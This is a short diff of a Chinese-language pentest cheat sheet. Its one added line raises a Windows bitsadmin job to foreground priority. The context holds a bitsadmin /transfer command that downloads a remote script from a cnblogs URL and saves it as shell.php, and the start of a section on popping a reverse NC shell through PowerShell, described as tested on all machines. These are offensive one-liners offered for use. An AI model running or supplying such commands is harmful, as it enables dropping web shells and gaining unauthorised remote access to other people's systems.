@@ -11,6 +11,7 @@ bitsadmin 可以跟随URL跳转.
 bitsadmin 不像curl  wget 这类工具那样能用来下载HTML页面。
 bitsadmin /transfer test http://files.cnblogs.com/files/gayhub/bcn.js  c:\users\xie\desktop\shell.php
 #"任务名" 可以随意起，保存文件的文件路径必须是已经存在的目录，否则不能下载。
+bitsadmin /setpriority test foreground     #设置任务test为最高优先级
 
 # cmd窗口下利用Powershell反弹NC shell 
 亲测所有机器都适用
